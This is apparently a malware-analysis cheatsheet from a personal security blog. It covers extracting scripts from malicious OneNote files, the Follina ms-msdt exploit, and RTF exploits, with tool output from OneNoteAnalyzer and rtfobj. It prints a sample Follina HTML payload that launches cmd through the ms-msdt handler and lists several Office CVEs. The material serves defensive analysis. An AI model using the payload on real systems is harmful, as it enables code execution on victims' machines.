---
title: Cheatsheet: Malicious Document Analysis
url: https://fareedfauzi.github.io/2024/04/20/Maldoc-Analysis.html
source: Over Security
date: 2026-11-10
fetch_date: 2026-11-11T08:35:24.456037
---

# Cheatsheet: Malicious Document Analysis

xml version="1.0" standalone="no"?

[root@fareed:~#](/ "Personal blog for research, education and note purpose.
")

* [Archive](/archive.html)
* [About](/about.html)

# Cheatsheet: Malicious Document Analysis

* [Malware](/archive.html?tag=Malware)

* Apr 20, 2024

# General

## What to look for in Maldoc analysis?

* URLs to download second payload such as fileless commands or executable
* Commands such as Powershell, Javascript, wscript, etc
* Filenames such as what it is downloaded and where it been downloaded
* Embedded file signatures such as PE header with MZ magic bytes
* Encoded file or commands

## Lab’s OS

* Use Windows VM to emulate the maldoc
* Use REMNUX to analyze the maldoc in depth

# OneNote Analysis

Download the OneNoteAnalyzer from the release page in [GitHub](https://github.com/knight0x07/OneNoteAnalyzer/releases/tag/OneNoteAnalyzer).

Run `OneNoteAnalyzer.exe --file malware.one` then it will extract the malicious script from the OneNote file.

```
D:\OneNoteAnalyzer>OneNoteAnalyzer.exe --file "AgreementCancelation_395076(Feb08).one"

________                 _______          __            _____                .__
\_____  \   ____   ____  \      \   _____/  |_  ____   /  _  \   ____ _____  |  | ___.__.________ ___________
 /   |   \ /    \_/ __ \ /   |   \ /  _ \   __\/ __ \ /  /_\  \ /    \\__  \ |  |<   |  |\___   // __ \_  __ \
/    |    \   |  \  ___//    |    (  <_> )  | \  ___//    |    \   |  \/ __ \|  |_\___  | /    /\  ___/|  | \/
\_______  /___|  /\___  >____|__  /\____/|__|  \___  >____|__  /___|  (____  /____/ ____|/_____ \\___  >__|
        \/     \/     \/        \/                 \/        \/     \/     \/     \/           \/    \/
                                        Author: @knight0x07

[+] OneNote Document Path: AgreementCancelation_395076(Feb08).one
[+] OneNote Document File Format: OneNote2010
[+] Extracting Attachments from OneNote Document

      -> Extracted OneNote Document Attachments:

             -> Extracted Actual Attachment Path: Z:\build\one | FileName: Open.cmd | Size: 1426

      -> OneNote Document Attachments Extraction Path: \AgreementCancelation_395076(Feb08)_content\OneNoteAttachments

[+] Extracting Page MetaData from OneNote Document

       -> Page Count: 1
       -> Page MetaData:

       ---------------------------------------------

             -> Title:
             -> Author: admin
             -> CreationTime: 8/2/2023 8:54:29 AM
             -> LastModifiedTime: 8/2/2023 2:04:43 PM

       ---------------------------------------------

[+] Extracting Images from OneNote Document

      -> Extracted OneNote Document Images:

             -> Extracted Image FileName: 1_?????????? ???????.png | HyperLinkURL: Null
             -> Extracted Image FileName: 2_?????????? ???????.png | HyperLinkURL: Null

      -> Image Extraction Path: \AgreementCancelation_395076(Feb08)_content\OneNoteImages

[+] Extracting Text from OneNote Document

      -> Extracted OneNote Document Text:

             -> Page:  | Extraction Path: \AgreementCancelation_395076(Feb08)_content\OneNoteText\1_.txt

[+] Extracting HyperLinks from OneNote Document

      -> Extracted OneNote Document HyperLinks:  (Note: Text might contain hyperlink if no overlay)

             -> Page:

                 -> Text:
                 -> Text:

      -> HyperLink Extraction Path: \AgreementCancelation_395076(Feb08)_content\OneNoteHyperLinks\onenote_hyperlinks.txt

[+] Converting OneNote Document to Image

         -> Saved Path: \AgreementCancelation_395076(Feb08)_content\ConvertImage_AgreementCancelation_395076(Feb08).png
```

Reviewing the extract files, such as `OneNoteAttachments` folder… shows the batch file that contains a malicious payload.

# MS-MSDT scheme aka Follina Exploit

A sample shared by nao\_sec that abusing ms-msdt to execute code. Refer [here](https://mobile.twitter.com/nao_sec/status/1530196847679401984).

Unzipping the documents, and navigate to `maldoc-name\word\_rels\document.xml.rels` will reveal the HTML URL which will execute their payload.

![image](https://user-images.githubusercontent.com/56353946/183518431-b8201056-19c3-4286-970f-67f51c3f8d93.png)

The payload might looks something like this:

```
<!doctype html>
    <html lang="en">
<body>
    <script>
    window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Start-Process('cmd'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
</script>
</body>
</html>
```

# RTF Exploit

RTF often comes with exploits targetting Microsoft Word vulnerabilities. Always look for embedded objects and anomalous content in the RTF.

Be prepared to locate, extract and analyze shellcode.

* Emulate using scdbg OR
* Execute using jmp2it OR
* Convert to executable and debug the executable using x32dbg
  + Find the start offset of the shellcode
* Behavioral analysis

RTF exploit list:

* CVE-2018-8570
* CVE-2018-0802
* CVE-2017-11882
* CVE-2017-0199
* CVE-2015-1641
* CVE-2014-1761
* CVE-2012-0158

## rtfobj

Use **rtfobj** to inspect and extract embedded objects from RTF files.

```
remnux@remnux:~/Desktop$ rtfobj malicious.rtf
rtfobj 0.55 on Python 3.6.9 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

===============================================================================
File: 'malicious.rtf' - size: 401748 bytes
---+----------+---------------------------------------------------------------
id |index     |OLE Object
---+----------+---------------------------------------------------------------
0  |0001076Ah |format_id: 2 (Embedded)
   |          |class name: b'Package'
   |          |data size: 159944
   |          |OLE Package object:
   |          |Filename: '8.t'
   |          |Source path: 'C:\\Aaa\\tmp\\8.t'
   |          |Temp path = 'C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t'
   |          |MD5 = '9bffe424e9b7be9e1461a3218923e110'
---+----------+---------------------------------------------------------------
1  |0005E98Ah |format_id: 2 (Embedded)
   |          |class name: b'Equation.2\x00\x124Vx\x90\x124VxvT2'
   |          |data size: 6436
   |          |MD5 = 'a09e82c26f94f3a9297377120503a678'
---+----------+---------------------------------------------------------------
2  |0005E970h |Not a well-formed OLE object
---+----------+---------------------------------------------------------------
```

To dump specific OLE Object:

```
remnux@remnux:~/Desktop$ rtfobj malicious.rtf -s 2
rtfobj 0.55 on Python 3.6.9 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

===============================================================================
File: 'malicious.rtf' - size: 401748 bytes
---+----------+---------------------------------------------------------------
id |index     |OLE Object
---+----------+---------------------------------------------------------------
0  |0001076Ah |format_id: 2 (Embedded)
   |          |class name: b'Package'
   |          |data size: 159944
   |          |OLE Package object:
   |          |Filename: '8.t'
   |          |Source path: 'C:\\Aaa\\tmp\\8.t'
   |          |Temp path = 'C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t'
   |          |MD5 = '9bffe424e9b7be9e1461a3218923e110'
---+----------+---------------------------------------------------------------
1  |0005E98Ah |format_id: 2 (Embedded)
   |          |class name: b'Equation.2\x00\x124Vx\x90\x124VxvT2'
   |          |data size: 6436
   |          |MD5 = 'a09e82c26f94f3a9297377120503a678'
---+----------+---------------------------------------------------------------
2  |0005E970h |Not a well-formed OLE object
---+----------+--------------------------------------...